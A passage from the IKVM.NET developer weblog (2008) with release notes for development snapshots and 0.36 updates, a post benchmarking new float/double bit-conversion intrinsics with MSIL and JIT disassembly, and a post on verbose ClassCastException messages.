<P>One thing isn't yet working, if you specify a Java security manager in your app.config it isn't guaranteed that the security manager will be installed immediately (currently it's only installed the first time <CODE>ClassLoader.getSystemClassLoader()</CODE> is called.) I'm not sure if it is worth fixing this, because using the Java security manager in this way doesn't seem to make much sense (i.e. if you are running your application as a .NET application, why would you use the Java security manager to restrict what it can do, it won't be able do a good job anyway, since it doesn't know about your non-Java .NET code that directly calls .NET Framework APIs.)</P>
<P>Changes since previous development snapshot:</P>
<UL>
<LI>Call suppressFillInStackTrace before instantiating a remapped exception in the remap implementation method.</LI>
<LI>Added assembly location to verbose class cast exception if the assembly fullnames matches but the locations don't.</LI>
<LI>Create the generic delegate type before compiling the rest of the core class library, to allow the core class library to use delegates.</LI>
<LI>Fixed name mangling bug. Dots in nested type names should be mangled, because they shouldn't affect the package name.</LI>
<LI>Include exception message in ClassCastException.</LI>
<LI>Added hack to support instantiating fake enums for types loaded in ReflectionOnly (to support custom attribute annotations that have enum values in ikvmstub).</LI>
<LI>Added -reference option to ikvmstub to load referenced assemblies from a specific location.</LI>
<LI>Refactored class library initialization.</LI>
<LI>Implemented Runtime.availableProcessor() using .NET 2.0 API.</LI>
<LI>Moved most java.lang.System "native" methods to the Java side.</LI>
<LI>Moved java.lang.Thread "native" methods to Java.</LI>
<LI>Implemented support for specifying Thread stack size.</LI>
<LI>Fix deserialization of double arrays.</LI>
<LI>Added more efficient float/double to/from int/long bits converters.</LI>
<LI>Made Double.doubleToRawLongBits/longBitsToDouble and Float.floatToRawIntBits/intBitsToFloat intrinsics.</LI>
<LI>Generalized the support infrastructure for adding compiler intrinsics.</LI>
<LI>Fixed Graphics2D.rotate() to convert rotation angle from radians (Java) to degrees (.NET).</LI>
<LI>Fixed libikvm-native.so build to include reference to gmodule-2.0 library.</LI>
<LI>Fixed build issue on Mono (gmcs implicitly references System.Core.dll and that caused a conflict with our locally defined ExtensionAttribute).</LI>
<LI>Fixed ikvmc not to open the key file for write access.</LI>
<LI>Added workarounds for mcs compiler bug (related to the mutual dependencies of IKVM assemblies).</LI>
<LI>Restructured code to remove (mcs) compiler warnings.</LI></UL>
<P><B>WARNING: THIS IS A DEVELOPMENT SNAPSHOT, NOT AN OFFICIAL RELEASE.</B><BR><BR>Development snapshots are intended for evaluating and keeping track of where the project is going, not for production usage. The binaries have not been extensively tested and are not strong named.<BR><BR>If you want to run this version on Mono, you'll need a Mono version built from recent svn, it does not work on Mono 1.9.<BR><BR>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.3063.zip">ikvmbin-0.37.3063.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/21/2008 07:16:08 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0eb30151-ed5c-4c5c-8eb7-8648be97b68e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0eb30151-ed5c-4c5c-8eb7-8648be97b68e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 09 May 2008</h2></div>
<div class="newsItems"><a name="a0404dd8a-88a8-4d62-9bcb-98324d57a2a9"></a><div class="entry">
	<h3 class="entryTitle">Compiler Intrinsics</h3>
	<div class="entryBody">
		 <p>Most compilers have some (or in some cases many)
 <a href="http://en.wikipedia.org/wiki/Intrinsic_function">intrinsic 
 functions</a>. HotSpot has a number of them (see
 <a href="https://openjdk.dev.java.net/source/browse/openjdk/jdk/trunk/hotspot/src/share/vm/classfile/vmSymbols.hpp?rev=257&view=markup">
 here</a>, search for &quot;intrinsics known to the runtime&quot;) as does the CLR JIT. 
 IKVM has had a couple as well (<a HREF="/PermaLink.aspx?guid=6d43cef3-f478-4af7-bd8d-e73d30884d61">System.arraycopy()</a>,
 <a HREF="/PermaLink.aspx?guid=5402bb0a-5f05-4939-9d13-fd42166155b6">
 AtomicReferenceFieldUpdater.newUpdater()</a>,
 <a HREF="/PermaLink.aspx?guid=33aed348-a990-40bd-9a01-7b903b918b55">
 String.toCharArray()</a>). These were sort of hacked into the compiler and I 
 finally decided to clean that up a little and add more scalable support for
 <a href="http://ikvm.cvs.sourceforge.net/ikvm/ikvm/runtime/intrinsics.cs?view=markup">
 adding intrinsincs</a>. The trigger to do this was that I added four more 
 intrinsics:
 <a href="http://java.sun.com/javase/6/docs/api/java/lang/Float.html#floatToRawIntBits(float)">
 Float.floatToRawIntBits()</a>,
 <a href="http://java.sun.com/javase/6/docs/api/java/lang/Float.html#intBitsToFloat(int)">
 Float.intBitsToFloat()</a>,
 <a href="http://java.sun.com/javase/6/docs/api/java/lang/Double.html#doubleToRawLongBits(double)">
 Double.doubleToRawLongBits()</a> and
 <a href="http://java.sun.com/javase/6/docs/api/java/lang/Double.html#longBitsToDouble(long)">
 Double.longBitsToDouble()</a>.</p>
 <p><b>Benchmark</b></p>
 <p>Here's a micro benchmark:</p>
 <p><code><font color="#0000FF">public class</font> <font color="#2b91af">test</font> {<br>
&nbsp; <font color="#0000FF">public static void</font> main(<font color="#2B91AF">String</font>[] args) {<br>
&nbsp;&nbsp;&nbsp; <font color="#0000FF">long</font> sum = 1;<br>
&nbsp;&nbsp;&nbsp; <font color="#0000FF">long</font> start = 
 <font color="#2B91AF">System</font>.currentTimeMillis();<br>
&nbsp;&nbsp;&nbsp; <font color="#0000FF">for</font> (<font color="#0000FF">int</font> i = 0; i &lt; 10000000; i++) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sum += <font color="#2B91AF">Double</font>.doubleToRawLongBits(sum);<br>
&nbsp;&nbsp;&nbsp; }<br>
&nbsp;&nbsp;&nbsp; <font color="#0000FF">long</font> end = <font color="#2B91AF">System</font>.currentTimeMillis();<br>
&nbsp;&nbsp;&nbsp; <font color="#2B91AF">System</font>.out.println(end - start);<br>
&nbsp;&nbsp;&nbsp; <font color="#2B91AF">System</font>.out.println(sum);<br>
&nbsp; }<br>
 }</code></p>
 <p>Here are the results:</p>
 <table border="0" cellpadding="0" cellspacing="0">
  <tr>
   <td style="border-right: solid 1px black; border-bottom: solid 1px black">&nbsp;</td>
   <td style="border-bottom: solid 1px black">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
   x86 (aligned)</td>
   <td style="border-bottom: solid 1px black">&nbsp;&nbsp;&nbsp; x86 
   (unaligned)</td>
   <td style="border-bottom: solid 1px black">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; 
   x64</td>
  </tr>
  <tr>
   <td style="border-right: solid 1px black">
   JDK 1.6 HotSpot Server VM&nbsp;&nbsp;&nbsp; </td>
   <td align="right">
   287</td>
   <td align="right">
   &nbsp;</td>
   <td align="right">
   109</td>
  </tr>
  <tr>
   <td style="border-right: solid 1px black">JDK 
   1.6 HotSpot Client VM</td>
   <td align="right">
   335</td>
   <td align="right">
   &nbsp;</td>
   <td align="right">&nbsp;</td>
  </tr>
  <tr>
   <td style="border-right: solid 1px black">IKVM 
   0.36 .NET 1.1</td>
   <td align="right">
   479</td>
   <td align="right">
   565</td>
   <td align="right">&nbsp;</td>
  </tr>
  <tr>
   <td style="border-right: solid 1px black">IKVM 
   0.36 .NET 2.0</td>
   <td align="right">
   570</td>
   <td align="right">
   704</td>
   <td align="right">124</td>
  </tr>
  <tr>
   <td style="border-right: solid 1px black">IKVM 0.37</td>
   <td align="right">
   338</td>
   <td align="right">
   468</td>
   <td align="right">101</td>
  </tr>
  </table>
 <p><br>
 Since the x86 .NET results are highly sensitive as to whether the double on 
 the stack
 <a HREF="/PermaLink.aspx?guid=f300c4e1-15b0-45ed-b6a6-b5dc8fb8089e">
 happens to be aligned or not</a>, I included both results.</p>
 <p><b>Implementation</b></p>
 <p>Here's the MSIL that IKVM generates for the loop:</p>
 <p><code>IL_000b:&nbsp;&nbsp; ldloc.2<br>
 IL_000c:&nbsp;&nbsp; ldc.i4&nbsp;&nbsp;&nbsp; 0x989680<br>
 IL_0011:&nbsp;&nbsp; bge&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IL_0028<br>
 IL_0016:&nbsp;&nbsp; ldloc.0<br>
 IL_0017:&nbsp;&nbsp; ldloc.0<br>
 IL_0018:&nbsp;&nbsp; conv.r8<br>
 IL_0019:&nbsp;&nbsp; ldloca.s&nbsp; V_3<br>
 IL_001b:&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int64 
 [IKVM.Runtime]IKVM.Runtime.DoubleConverter::ToLong(float64,<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;valuetype [IKVM.Runtime]IKVM.Runtime.DoubleConverter&amp;)<br>
 IL_0020:&nbsp;&nbsp; add<br>
 IL_0021:&nbsp;&nbsp; stloc.0<br>
 IL_0022:&nbsp;&nbsp; ldloc.2<br>
 IL_0023:&nbsp;&nbsp; ldc.i4.1<br>
 IL_0024:&nbsp;&nbsp; add<br>
 IL_0025:&nbsp;&nbsp; stloc.2<br>
 IL_0026:&nbsp;&nbsp; br.s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IL_000b</code></p>
 <p>The conversion isn't actually inlined, but instead a local variable of 
 value type <code>IKVM.Runtime.DoubleConverter</code> is added to the method 
 and a static method on that type that takes the value to be converted and a 
 reference to the local variable is called. Here's the code for <code>IKVM.Runtime.DoubleConverter</code>:</p>
 <p><code>[<font color="#2B91AF">StructLayout</font>(<font color="#2B91AF">LayoutKind</font>.Explicit)]<br>
 <font color="#0000FF">public struct</font> <font color="#2B91AF">DoubleConverter</font><br>
 {<br>
 &nbsp;
 [<font color="#2B91AF">FieldOffset</font>(0)]<br>
 &nbsp; <font color="#0000FF">private double</font> d;<br>
 &nbsp;
 [<font color="#2B91AF">FieldOffset</font>(0)]<br>
 &nbsp; <font color="#0000FF">private long</font> l;<br>
 <br>
 &nbsp; <font color="#0000FF">public static long</font> ToLong(<font color="#0000FF">double</font> value, 
 <font color="#0000FF">ref</font> <font color="#2B91AF">DoubleConverter</font> converter)<br>
 &nbsp;
 {<br>
 &nbsp;&nbsp;&nbsp;
 converter.d = value;<br>
 &nbsp;&nbsp;&nbsp; <font color="#0000FF">return</font> converter.l;<br>
 &nbsp;
 }<br>
 <br>
 &nbsp; <font color="#0000FF">public static double</font> ToDouble(<font color="#0000FF">long</font> value, 
 <font color="#0000FF">ref</font> <font color="#2B91AF">DoubleConverter</font> converter)<br>
 &nbsp;
 {<br>
 &nbsp;&nbsp;&nbsp;
 converter.l = value;<br>
 &nbsp;&nbsp;&nbsp; <font color="#0000FF">return</font> converter.d;<br>
 &nbsp;
 }<br>
 }</code></p>
 <p>It uses the .NET feature that allows you to explicitly control the layout 
 of a struct&nbsp; to overlay the double and long fields. Note that this 
 construct is fully verifiable.</p>
 <p>For comparison, the standard
 <a href="http://msdn.microsoft.com/en-us/library/system.bitconverter.doubletoint64bits(VS.71).aspx">
 System.BitConverter.DoubleToInt64Bits()</a> uses unsafe code and looks 
 something like this:</p>
 <p><code><font color="#0000FF">public static unsafe long</font> 
 DoubleToInt64Bits(<font color="#0000FF">double</font> value)<br>
 {<br>
&nbsp; <font color="#0000FF">return</font> *((<font color="#0000FF">long</font>*)&amp;value);<br>
 }</code></p>
 <p>For some reason (probably because it isn't verifiable) the JIT doesn't 
 like this so much and doesn't inline this method.</p>
 <p><b>JIT Code</b></p>
 <p>Here's the x86 code generated by the .NET 2.0 SP1 JIT:</p>
 <p><code>049E15CE&nbsp; cmp&nbsp;&nbsp;&nbsp; ebx,989680h<br>
 049E15D4&nbsp; jge&nbsp;&nbsp;&nbsp; 049E1600 <br>
 049E15D6&nbsp; lea&nbsp;&nbsp;&nbsp; ecx,[esp+8] <br>
 049E15DA&nbsp; mov&nbsp;&nbsp;&nbsp; dword ptr [esp+10h],esi <br>
 049E15DE&nbsp; mov&nbsp;&nbsp;&nbsp; dword ptr [esp+14h],edi <br>
 049E15E2&nbsp; fild&nbsp;&nbsp; qword ptr [esp+10h] <br>
 049E15E6&nbsp; fstp&nbsp;&nbsp; qword ptr [esp+10h] <br>
 049E15EA&nbsp; fld&nbsp;&nbsp;&nbsp; qword ptr [esp+10h] <br>
 049E15EE&nbsp; fstp&nbsp;&nbsp; qword ptr [ecx] <br>
 049E15F0&nbsp; mov&nbsp;&nbsp;&nbsp; eax,dword ptr [ecx] <br>
 049E15F2&nbsp; mov&nbsp;&nbsp;&nbsp; edx,dword ptr [ecx+4] <br>
 049E15F5&nbsp; add&nbsp;&nbsp;&nbsp; eax,esi <br>
 049E15F7&nbsp; adc&nbsp;&nbsp;&nbsp; edx,edi <br>
 049E15F9&nbsp; mov&nbsp;&nbsp;&nbsp; esi,eax <br>
 049E15FB&nbsp; mov&nbsp;&nbsp;&nbsp; edi,edx <br>
 049E15FD&nbsp; inc&nbsp;&nbsp;&nbsp; ebx <br>
 049E15FE&nbsp; jmp&nbsp;&nbsp;&nbsp; 049E15CE</code></p>
 <p>Here's the x64 code generated by the .NET 2.0 SP1 JIT:</p>
 <p><code>00000642805B8A90&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,989680h<br>
 00000642805B8A96&nbsp; jge&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00000642805B8AB1 <br>
 00000642805B8A98&nbsp; cvtsi2sd&nbsp;&nbsp; xmm0,rdi <br>
 00000642805B8A9D&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rax,[rsp+20h] <br>
 00000642805B8AA2&nbsp; movsd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mmword ptr [rax],xmm0 <br>
 00000642805B8AA6&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rax,qword ptr [rax] <br>
 00000642805B8AA9&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rdi,rax <br>
 00000642805B8AAC&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,1 <br>
 00000642805B8AAF&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00000642805B8A90</code></p><p>
 In both cases the construct is inlined properly. It is also obvious why the 
 x64 code is so much faster, it uses SSE (as we've seen before) and only uses 
 one memory store/load combination.</p>
 <p>
 <b>HotSpot</b></p>
 <p>
 For completeness, here's the code generated by HotSpot x64:</p>
 <p><code>0000000002772EA0&nbsp; cvtsi2sd&nbsp;&nbsp; xmm0,r11 <br>
 0000000002772EA5&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebp,10h <br>
 0000000002772EA8&nbsp; movsd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mmword ptr [rsp+20h],xmm0 <br>
 0000000002772EAE&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,qword ptr [rsp+20h] <br>
 0000000002772EB3&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,r11 <br>
 0000000002772EB6&nbsp; cvtsi2sd&nbsp;&nbsp; xmm0,r10 <br>
 0000000002772EBB&nbsp; movsd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mmword ptr [rsp+20h],xmm0 <br>
 0000000002772EC1&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,qword ptr [rsp+20h] <br>
 0000000002772EC6&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,r10 <br>
 0000000002772EC9&nbsp; cvtsi2sd&nbsp;&nbsp; xmm0,r11 <br>
 0000000002772ECE&nbsp; movsd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mmword ptr [rsp+20h],xmm0 <br>
 0000000002772ED4&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,qword ptr [rsp+20h] <br>
 0000000002772ED9&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,r11 <br>
 [...]<br>
 0000000002772FC0&nbsp; cvtsi2sd&nbsp;&nbsp; xmm0,r10 <br>
 0000000002772FC5&nbsp; movsd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mmword ptr [rsp+20h],xmm0 <br>
 0000000002772FCB&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,qword ptr [rsp+20h] <br>
 0000000002772FD0&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,r10 <br>
 0000000002772FD3&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebp,r9d <br>
 0000000002772FD6&nbsp; jl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0000000002772EA0</code></p>
 <p>
 It actually unrolled the loop 16 times (which appears not be helping in the 
 case), but otherwise the code generated is pretty similar to what we saw on 
 the CLR. Of course, in HotSpot <code>Double.doubleToRawIntBits()</code> is also an 
 intrinsic because in Java the only alternative would be to write it in 
 native code and the JNI transition would add significant overhead in this 
 case.</p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/09/2008 11:27:51 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0404dd8a-88a8-4d62-9bcb-98324d57a2a9"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0404dd8a-88a8-4d62-9bcb-98324d57a2a9">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 05 May 2008</h2></div>
<div class="newsItems"><a name="ae7edbafa-82e6-4e0d-b3e5-0a9fd6dea416"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 Update 2 Release Candidate 1</h3>
	<div class="entryBody">
		<P>A couple of fixes.</P>
<P><B>Changes:</B></P>
<UL>
<LI>Remapped exceptions with explicit remapping code now call suppressFillInStackTrace (to make sure the proper stack trace is captured).</LI>
<LI>Fixed memory mapped file bug (mapping at a non-zero file offset would fail).</LI>
<LI>Fixed .NET type name mangling for nested types that contain a dot in their name (which the C# 3.0 compiler generates for some private helper types).</LI>
<LI>Fixed java.io.File.getCanonicalPath() to swallow System.NotSupportedException (thrown when the path contains a colon, other than the one following the drive letter).</LI>
<LI>Fixed bug in deserialization of double arrays.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.12.zip">ikvmbin-0.36.0.12.zip</A><BR>Sources (+ binaries):<A href="http://www.frijters.net/ikvm-0.36.0.12.zip">ikvm-0.36.0.12.zip</A> </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/05/2008 06:23:35 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e7edbafa-82e6-4e0d-b3e5-0a9fd6dea416"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e7edbafa-82e6-4e0d-b3e5-0a9fd6dea416">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 17 April 2008</h2></div>
<div class="newsItems"><a name="af4d539b4-7573-4355-a455-e299d4a7087e"></a><div class="entry">
	<h3 class="entryTitle">Invalid Casting Goodness</h3>
	<div class="entryBody">
		<P>Yesterday <A href="http://tirania.org/blog/archive/2008/Apr-16-1.html">Miguel</A> blogged about a nice new feature in Mono. I added the IKVM_VERBOSE_CAST environment variable to IKVM to do something similar <A HREF="/PermaLink.aspx?guid=bf2b1c39-ab75-4de0-b07f-346d744e1d4ahttp://weblog.ikvm.net/PermaLink.aspx?guid=bf2b1c39-ab75-4de0-b07f-346d744e1d4a">a while ago</A>.</P>
<P><CODE><FONT color=#0000ff>public class</FONT> <FONT color=#2b91af>test</FONT> {<BR>&nbsp; <FONT color=#0000ff>public static void</FONT> main(<FONT color=#2b91af>String</FONT>[] args) {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>System</FONT>.out.println((<FONT color=#2b91af>String</FONT>)(<FONT color=#2b91af>Object</FONT>)args);<BR>&nbsp; }<BR>}</P>
<P>C:\j&gt;\ikvm-0.36.0.11\bin\ikvm test<BR>Exception in thread "main" java.lang.ClassCastException<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at test.main(test.java)<BR><BR>C:\j&gt;set IKVM_VERBOSE_CAST=1<BR><BR>C:\j&gt;\ikvm-0.36.0.11\bin\ikvm test<BR>Exception in thread "main" java.lang.ClassCastException: Object of type "System.String[], mscorlib, Version=1.0.5000.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" cannot be cast to "System.String, mscorlib, Version=1.0.5000.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at test.main(test.java)</CODE></P>
<P>Note that the assembly qualified type names are displayed, as I believe this feature is particularly useful when trying to debug issues that arise from having loaded multiple assemblies that contain the "same" types.</P>
<P>While writing this I discovered that both JDK 1.6 and .NET 2.0 always generate descriptive exception messages for invalid casts:</P>
<P><CODE>C:\j&gt;\jdk1.6\bin\java test<BR>Exception in thread "main" java.lang.ClassCastException: [Ljava.lang.String; can not be cast to java.lang.String<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at test.main(test.java:5)</P>
<P>C:\j&gt;\ikvm\bin\ikvm test<BR>Exception in thread "main" java.lang.ClassCastException: Unable to cast object of type 'System.String[]' to type 'System.String'.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at test.main(test.java:5)</CODE></P>
<P>This last result is my local ikvm development version running on .NET 2.0 with a patch to enable taking the exception message from the .NET InvalidCastException, which I didn't previously do because on .NET 1.1 this message didn't contain any useful information.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/17/2008 08:51:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f4d539b4-7573-4355-a455-e299d4a7087e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f4d539b4-7573-4355-a455-e299d4a7087e">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 14 April 2008</h2></div>
<div class="newsItems"><a name="a8d0c4cfc-b9ed-43fe-920a-00d27be1ca90"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>It's been quite a while since the last development snapshot. I'm still working on integrating .NET 2.0 features, but I'm also doing random fixes/improvements here and there as I come across them. The biggest visible change in this snapshot is the support for defining .NET properties as Java fields. The main motivation was that I wanted to handle the <CODE>System.in/out/err</CODE> fields more cleanly. They are now implemented like this:</P>
<P><CODE>@ikvm.lang.<FONT color=#2b91af>Property</FONT>(get="get_in")<BR><FONT color=#0000ff>public final static</FONT> <FONT color=#2b91af>InputStream</FONT> in;<BR><BR><FONT color=#0000ff>static</FONT> { in = <FONT color=#0000ff>null</FONT>; }<BR><BR><FONT color=#0000ff>private static</FONT> <FONT color=#2b91af>InputStream</FONT> get_in()<BR>{<BR><FONT color=#0000ff>&nbsp;&nbsp;&nbsp; return</FONT> StdIO.in;<BR>}</CODE></P>
<P>This defines a .NET property called "in" and associates the getter method of the property with the get_in() method. Note that we're only specifying the getter here in the Property annotation because the field is final, but you can also specify a setter method. The static initializer that initializes the property to null is necessary to keep javac happy, but it doesn't actually do anything. The ikvm bytecode compiler will ignore any assignments to read-only properties. Another thing to note is that the get_in() will automatically be made public (because the field is public), but from Java it will still appear private.</P>
<P>Changes since previous development snapshot:</P>
<UL>
<LI>Fixed regression in return value annotation value.</LI>
<LI>Forked Class, Constructor and Field.</LI>
<LI>Made class annotation handling lazy and bypass encode/decode.</LI>
<LI>Fixed ReflectionOnly referenced assembly loading order (ikvmstub).</LI>
<LI>Initialize class library in JVM_CreateJavaVM.</LI>
<LI>Reintroduced guard against recursive FinishCore invocations.</LI>
<LI>Implemented support for annotations on .NET fields/methods/parameters.</LI>
<LI>Hide ikvmc generated GetEnumerator() method from Java.</LI>
<LI>Simplified annotation handling.</LI>
<LI>Added support to Class.forName() for assembly qualified Java type names.</LI>
<LI>Replaced notion of DynamicOnly types with Fake types. Fake types are implemented as generic type instances and can have DynamicOnly methods.</LI>
<LI>Changed System.nanoTime() implementation to use Stopwatch.GetTimestamp().</LI>
<LI>Ripped out annotation/constant pool support that is no longer needed.</LI>
<LI>Added support for defining unloadable (i.e. missing) types to use as custom modifiers in signatures.</LI>
<LI>Use custom modifiers to make sure constructor signature is unique (if necessary).</LI>
<LI>Restructured code to remove compiler warnings.</LI>
<LI>Updated FlushFileBuffers p/invoke to use SafeFileHandle.</LI>
<LI>Forked OpenJDK sources that are going to be modified to refactor the library initialization.</LI>
<LI>Made __Fields nested class abstract (it was already sealed) and removed the constructor.</LI>
<LI>Restored the special case for interface .cctor methods to fix bug #1930303</LI>
<LI>Added ikvm/internal/MonoUtils.java. A new helper class to contain Mono specific methods.</LI>
<LI>Added Mac OS X platform detection.</LI>
<LI>Fixed System.mapLibraryName() to use platform detection instead of os.name property.</LI>
<LI>Improved java.library.path for Windows, Linux and Mac OS X.</LI>
<LI>Added support for setting os.name and os.ver on Mac OS X.</LI>
<LI>Try to guess os.arch based on IntPtr.Size.</LI>
<LI>Set sun.nio.MaxDirectMemorySize to -1 to allow "unlimited" direct byte buffers.</LI>
<LI>Fixed memory mapped file bug that caused mapping at non-zero file position to fail.</LI>
<LI>Close mapping handle using the Close() method on SafeFileHanlde instead of p/invoking the Win32 API directly.</LI>
<LI>Added support for filenames/paths with colons in them to Win32FileSystem.CanonicalizePath().</LI>
<LI>Added support for turning Java fields into .NET properties with an annotation.</LI>
<LI>Implemented System.in/out/err as .NET properties (explicitly).</LI></UL>
<P><B>WARNING: THIS IS A DEVELOPMENT SNAPSHOT, NOT AN OFFICIAL RELEASE.</B><BR><BR>Development snapshots are intended for evaluating and keeping track of where the project is going, not for production usage. The binaries have not been extensively tested and are not strong named.<BR><BR>If you want to run this version on Mono, you'll need a Mono version built from recent svn, it does not work on Mono 1.9.<BR><BR>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.3026.zip">ikvmbin-0.37.3026.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/14/2008 07:40:06 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8d0c4cfc-b9ed-43fe-920a-00d27be1ca90"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8d0c4cfc-b9ed-43fe-920a-00d27be1ca90">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 07 April 2008</h2></div>
<div class="newsItems"><a name="ae4dfe72d-a2ca-4d8d-be42-4f977b9b88b6"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 Update 1 Released</h3>
	<div class="entryBody">
		<P>When I released IKVM 0.36 I said I intended to support 0.36 for a longer period since it is the last version that runs on .NET 1.1. Today I've released the first update release of 0.36 to <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">SourceForge</A>. For those who have been tracking the release candidates, this release is identical to release candidate 5.</P>
<P>Changes since <A HREF="/PermaLink.aspx?guid=99f7699f-dfc9-4ea9-b08e-fee3c840fc32">IKVM 0.36.0.5</A>:</P>
<UL>
<LI>Changed version to IKVM 0.36.0.11 
<LI>Fix for reflection bug on .NET generic nested types that caused <A href="http://sourceforge.net/mailarchive/message.php?msg_name=477171a5.1ec37e0a.1f81.7bc8@mx.google.com">this</A>. 
<LI>Fix for bug <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1865922&amp;group_id=69637&amp;atid=525264">#1865922</A>. 
